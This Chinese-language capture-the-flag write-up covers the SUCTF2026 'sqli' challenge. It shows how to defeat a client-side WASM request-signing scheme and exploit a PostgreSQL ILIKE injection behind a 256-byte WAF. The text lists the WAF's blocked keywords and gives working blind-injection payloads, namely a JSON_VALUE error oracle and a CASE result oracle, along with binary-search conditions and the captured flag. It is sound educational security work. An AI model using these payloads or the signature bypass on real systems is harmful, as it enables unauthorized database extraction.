# SUCTF2026-sqli

## 题目简述

题目是一个带客户端签名保护的 PostgreSQL 搜索接口。前端先从 `/api/sign` 获取一次性 `nonce`、时间戳、salt 和被拆包混淆的 seed，再通过两个 Go WASM 模块与一层 JavaScript glue 计算签名；只有携带有效签名的 `/api/query` 请求才会进入 SQL 查询。

签名通过后，`q` 被直接拼进 `ILIKE` 字符串，存在 SQL 注入。官方预期利用 PostgreSQL 17 的 `JSON_VALUE ... RETURNING INTEGER ERROR ON ERROR` 构造错误型布尔 oracle，在 WAF 的 256 字节限制内二分读出 `secrets.flag`。总 WP 使用搜索结果“有记录/无记录”作为另一种布尔 oracle，同样可行，但不是官方单题 WP 的主线。

## 解题过程

### 1. 还原请求协议与一次性 nonce

`GET /api/sign` 返回：

```json
{
  "ok": true,
  "data": {
    "nonce": "<base64url>",
    "ts": 0,
    "seed": "<四段base64url，以点分隔>",
    "salt": "<base64url>",
    "algo": "v6"
  }
}
```

`POST /api/query` 需要：

```json
{
  "q": "search text",
  "nonce": "...",
  "ts": 0,
  "sign": "..."
}
```

服务端的 `NonceStore` 有两个重要约束：

- nonce 保存时间为 60 秒；
- `Consume` 校验成功或失败取得条目后都会把 nonce 删除，不能重复使用。

因此盲注的每一次条件判断都要重新请求 `/api/sign` 并重新计算签名。签名内部使用 `ts/30000` 作为 30 秒 bucket，但这不等于 nonce 可以复用 30 秒。

签名还绑定 `User-Agent`：服务端签发 seed 时记录第一次请求的 UA，校验 query 时又用第二次请求的 UA 计算预期签名，所以两次请求必须使用完全相同的 UA。

### 2. 区分真正绑定项与前端混淆项

`application/app.js` 生成的 probe 为：

```text
wd=<webdriver>;tz=<timezone>;b=<brands>;intl=<0或1>
```

浏览器流程是：

```text
__suPrep(...)           // crypto1.wasm
  -> unscramble(...)    // app.js
  -> mixSecret(probe)   // app.js
  -> __suFinish(...)    // crypto2.wasm
  -> sign
```

从当前仓库服务端 `sign.Sign` 可见，最终校验只使用：

```text
method | path | q | nonce | ts | User-Agent | salt | server secret
```

服务端不接收 probe，也不读取 `sec-ch-ua`、时区或 brands。WASM2 会先执行 `unmix`，恰好逆掉 JS 的 `mixSecret`，所以 probe 的正常混合不会进入最终签名；它主要用于增加逆向噪声。唯一需要注意的是 WASM1 的：

```go
if len(q) == 0 || method == "GET" || isDebug(probe) {
    return decoy(...)
}
```

其中 `isDebug` 检查 `wd=1`。本地签名器应使用 `wd=0`，否则得到的是 decoy。总 WP 中“必须复制完整 Chrome Client Hints 才能通过”的现象可能来自赛时脚本或环境差异；按当前源码，必要的请求头只有前后保持一致的 `User-Agent`。

### 3. 方案一：按官方源码直接复现签名

服务端 `SeedPackFor` 先生成：

```text
k1    = KDF(nonce || little_endian(ts) || "k9v3_suctf26_sigma", SALT_SEED)
seed  = server_secret XOR k1
dyn   = uaMixKey(User-Agent, salt, ts)
seedX = permute(seed XOR dyn)
```

然后把 `seedX` 切成四个 8 字节块。块顺序、左右随机填充长度和逐字节 XOR mask 都由：

```text
KDF(nonce || "|" || salt || "|" || ts/30000, SALT_PERM)
```

决定，最后编码成四段 base64url，用 `.` 连接。

本地签名器依次反向执行：

1. 根据 nonce、salt、bucket 重新得到块排列、padding 长度和 mask；
2. 对每段 base64url 解码，剥离左右 padding，撤销 `mask[idx] + j*17`；
3. 按原索引拼回 32 字节并执行 `permuteInv`；
4. 结合同一 UA 计算 `dyn`，恢复 server secret 的等价中间值；
5. 对消息 `POST|/api/query|q|ts|nonce` 计算消息 KDF；
6. XOR、逐 32 位字旋转排列，最后输出 base64url。

可以把核心关系化简为：

```text
secret2 = server_secret XOR uaMixKey(ua, salt, ts)
m       = KDF("POST|/api/query|" + q + "|" + ts + "|" + nonce, SALT_MSG)
sign    = base64url(permute(secret2 XOR m))
```

官方 `exp/exp.py` 与 `env/web_deploy/tools/exp.py` 已给出同源 Python 实现。写入 WP 时没有必要复制数百行 KDF；复现时应直接逐函数对照 `internal/sign/sign.go`，尤其保持 32 位无符号溢出、小端序、rotate 和 raw base64url 语义一致。

### 4. 方案二：直接复用原始 WASM

不想把 KDF 完整移植到 Python 时，可以像总 WP 一样在 Node 中加载题目附件：

```text
wasm_exec.js
crypto1.wasm -> 注册 globalThis.__suPrep
crypto2.wasm -> 注册 globalThis.__suFinish
```

再从 `app.js` 搬出以下明文函数：

```text
b64UrlToBytes
bytesToB64Url
maskBytes
unscramble
probeMask
mixSecret
```

调用顺序必须与浏览器完全一致：

```javascript
const pre = globalThis.__suPrep(
  "POST", "/api/query", q,
  material.nonce, String(material.ts),
  material.seed, material.salt,
  ua, "wd=0;tz=;b=;intl=0"
);

const secret2 = unscramble(pre, material.nonce, material.ts);
const mixed = mixSecret(secret2, probe, material.ts);
const sign = globalThis.__suFinish(
  "POST", "/api/query", q,
  material.nonce, String(material.ts),
  bytesToB64Url(mixed), probe
);
```

这条路线不是重新实现密码算法，而是把浏览器签名器搬进 Node。它更短，也更不易在整数溢出和字节序上出错；缺点是仍依赖题目的 WASM 与 Go runtime 文件。

### 5. 确认 SQL 拼接点与 WAF

服务端查询是源码级明文拼接：

```go
sql := "SELECT id, title FROM posts " +
       "WHERE status='public' AND title ILIKE '%" + req.Q + "%' LIMIT 20"
```

输入单引号会得到 PostgreSQL 未终止字符串错误，说明 `q` 确实落在字符串上下文。WAF 会拒绝长度大于 256 的输入，并用大小写不敏感正则屏蔽：

```text
--  /*  */  ;  union  or  and
pg_sleep  pg_read_file  copy  lo_
current_setting  information_schema  pg_catalog
to_number  cast  ::  chr  encode  decode  1/0
```

当前源码并没有单独屏蔽 `select`、`case`、`when`、`substr`、`ascii`、`length` 或 `JSON_VALUE`。总 WP 中提到的 `pg_attribute` 拦截不在当前 WAF 正则里，应以运行实例为准，不要把它写成固定源码事实。

### 6. 官方主线：PG17 JSON 错误 oracle

PostgreSQL 17 支持 SQL/JSON 的 `JSON_VALUE`，并允许指定返回类型及出错行为。下面的表达式会尝试把字符串 `x` 转成整数，并在转换失败时抛错：

```sql
JSON_VALUE('{"a":"x"}', '$.a'
           RETURNING INTEGER ERROR ON ERROR)
```

将它放入 `CASE`：

```sql
' || (SELECT CASE WHEN (<condition>)
     THEN JSON_VALUE('{"a":"x"}', '$.a'
                     RETURNING INTEGER ERROR ON ERROR)
     ELSE 0 END) || '
```

这里 `ELSE 0` 很重要：`THEN` 分支的声明返回类型是 INTEGER，另一分支也必须给整数，避免先因 `CASE` 类型不一致产生与条件无关的错误。

布尔含义为：

```text
condition 为真  -> 执行 JSON_VALUE 强制转换 -> API 返回 ok=false 与数据库错误
condition 为假  -> CASE 返回 0             -> 查询正常，API 返回 ok=true
```

先分别测试 `1=1` 与 `1=0`。官方脚本准备了 `ERROR ON ERROR` 与 `ON ERROR ERROR` 两种语序模板，逐个试出当前 PostgreSQL 构建接受的形式，再开始二分。

长度条件：

```sql
length((select flag from secrets limit 1)) > <mid>
```

字符条件：

```sql
ascii(substr((select flag from secrets limit 1), <pos>, 1)) > <mid>
```

对长度和可打印 ASCII 区间分别二分，每次重新取得 nonce、按同一 UA 签名 payload，再根据 `ok` 判断条件。这样每个字符只需约 7 次请求，同时能保持 payload 小于 256 字节。

### 7. 替代路线：利用搜索结果构造布尔 oracle

总 WP 使用字符串拼接而不主动制造错误：

```sql
'||(select case when <condition>
    then 'su' else 'zzzzzz' end)||'
```

数据库种子中存在标题 `Welcome to SU Query`。条件为真时，最终 `ILIKE` 搜索词包含 `su`，响应 `data` 有记录；条件为假时搜索不存在的 `zzzzzz`，响应为空。测试：

```sql
'||(select case when 1=1 then 'su' else 'zzzzzz' end)||'
'||(select case when 1=2 then 'su' else 'zzzzzz' end)||'
```

若一有结果、一无结果，即可用相同的 `length`、`ascii(substr(...))` 条件二分。黑盒枚举时，`information_schema` 被屏蔽，可以用未限定 schema 名的 `pg_tables` 找 public 表；若列枚举受限，也可把整行转成 JSON：

```sql
concat((select to_json(x)
        from (select * from secrets limit 1) x))
```

再逐字符读取。该路线依赖已知搜索词在 `posts` 中稳定命中；官方错误 oracle 不依赖结果集内容，通常更稳。

### 8. 最终结果

`db/init.sql` 中的静态 flag 为：

```text
SUCTF{P9s9L_!Nject!On_IS_3@$Y_RiGht}
```

线上若通过推送脚本更新 `secrets.flag`，应以盲注结果为准。

## 方法总结

本题要先拆掉“客户端签名就是鉴权”的错觉。签名算法和恢复 seed 所需的全部逻辑都交付给浏览器；无论按 Go 源码移植，还是直接复用原始 WASM，都可以为任意 `q` 生成有效签名。真正受服务端绑定的是一次性 nonce、时间戳、salt 与前后一致的 User-Agent，Client Hints 和正常 probe 混合并不是额外秘密。

SQL 阶段的关键是适应 WAF 和 256 字节上限。官方利用 PG17 JSON 强制类型转换形成错误型布尔 oracle，避免被屏蔽的联合查询、注释和显式 cast；搜索结果 oracle 则是数据依赖的替代方案。两条路线都应做到每次条件请求先取新 nonce，再签名，再根据稳定的单一信号二分。
